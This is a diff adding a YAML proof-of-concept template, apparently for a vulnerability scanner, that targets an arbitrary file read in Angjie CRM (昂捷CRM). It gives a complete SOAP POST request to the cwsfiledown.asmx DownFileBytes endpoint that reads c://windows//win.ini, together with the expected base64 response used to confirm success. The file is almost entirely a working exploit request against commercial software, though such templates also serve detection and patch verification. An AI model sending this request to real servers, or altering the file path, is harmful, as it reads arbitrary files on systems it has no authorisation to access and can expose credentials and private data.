@@ -1,0 +1,32 @@
+id:
+info:
+  name: 昂捷CRM cwsfiledown.asmx 任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    Content-Length: length
+    SOAPAction: "http://tempuri.org/DownFileBytes"
+  data: |
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <DownFileBytes xmlns="http://tempuri.org/">
+          <sFileName>c://windows//win.ini</sFileName>
+          <iPosition>1</iPosition>
+          <iReadBytesLen>100</iReadBytesLen>
+          <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>
+        </DownFileBytes>
+      </soap:Body>
+    </soap:Envelope>
+response1:
+  headers:
+  body: IGZvciAxNi1iaXQ
+  code: 200
+requests2:
+response2:
